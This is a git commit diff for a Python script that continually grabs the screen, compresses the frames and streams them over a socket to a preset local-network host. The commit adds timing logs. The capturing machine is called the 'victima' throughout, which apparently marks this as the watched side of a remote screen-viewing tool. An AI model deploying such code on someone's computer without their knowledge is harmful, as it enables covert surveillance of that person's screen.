e917c7a0efc15b5f5eea8d1448894a972f8df641
Ilia Dubrovskii <iliadubrovskii01@gmail.com>
2021-06-03 03:18:04 +0300

    [TEST] change req.txt and add logging

--- main.py
+++ main.py
@@ -1,38 +1,77 @@
 import datetime
+import time
 import socket
-import screeninfo
+import numpy as np
+import logging
 
 from cv2 import cv2
 from mss import mss
 from zlib import compress
+from PIL import Image
+
+
+logFormatter = logging.Formatter(
+    '%(asctime)s.%(msecs)d %(message)s',
+    datefmt='%Y-%m-%dT%H:%M:%S',
+)
+LOGGER = logging.getLogger()
+LOGGER.setLevel(logging.INFO)
+
+fileHandler = logging.FileHandler('logs/screen_share_victima.log', mode='w')
+fileHandler.setFormatter(logFormatter)
+LOGGER.addHandler(fileHandler)
+
+consoleHandler = logging.StreamHandler()
+consoleHandler.setFormatter(logFormatter)
+LOGGER.addHandler(consoleHandler)
+
+FRAME_NUM = 0
+
+
+def check_time():
+    def decorator(func):
+        def wrapper(*args, **kwargs):
+            start = time.time()
+            return_value = func(*args, **kwargs)
+            end = time.time()
+
+            LOGGER.info(f'victima:{func.__name__}:{(end - start) * 100:.2f}ms:{FRAME_NUM}')
+
+            return return_value
+        return wrapper
+    return decorator
 
 
 def send_screenshots(conn):
-    monitor = screeninfo.get_monitors()[0]
-    width, height = monitor.width, monitor.height
+    global FRAME_NUM
+
+    @check_time()
+    def grab_screen():
+        return sct.grab(sct.monitors[1])
+
+    @check_time()
+    def process_img():
+        img_arr = cv2.resize(np.array(img), (1200, 720))
+        img_low_res = Image.fromarray(img_arr, 'RGBA')
+        return compress(img_low_res.tobytes())
+
+    @check_time()
+    def send_img():
+        size = len(pixels)
+        size_len = (size.bit_length() + 7) // 8
+        conn.send(bytes([size_len]))
+
+        size_bytes = size.to_bytes(size_len, 'big')
+        conn.send(size_bytes)
+
+        conn.send(pixels)
 
     with mss() as sct:
-        rect = {'top': 0, 'left': 0, 'width': width, 'height': height}
-
         while 'recording':
-            img = sct.grab(rect)
-            pixels = compress(img.bgra)
-
-            # pixels = decompress(pixels)
-            # print(img.size)
-            # img = Image.frombytes('RGB', img.size, pixels, 'raw', 'BGRX')  # Convert to PIL.Image
-            # img.show()  # Show the image using the default image viewer
-            # exit(0)
-
-            size = len(pixels)
-            size_len = (size.bit_length() + 7) // 8
-            conn.send(bytes([size_len]))
-
-            size_bytes = size.to_bytes(size_len, 'big')
-            conn.send(size_bytes)
-
-            conn.send(pixels)
-            print(f'{datetime.datetime.now()} - sent')
+            FRAME_NUM += 1
+            img = grab_screen()
+            pixels = process_img()
+            send_img()
 
 
 def main(host='192.168.0.139', port=9090):
@@ -53,3 +92,4 @@ def main(host='192.168.0.139', port=9090):
 
 if __name__ == '__main__':
     main()
+    # send_screenshots(None)
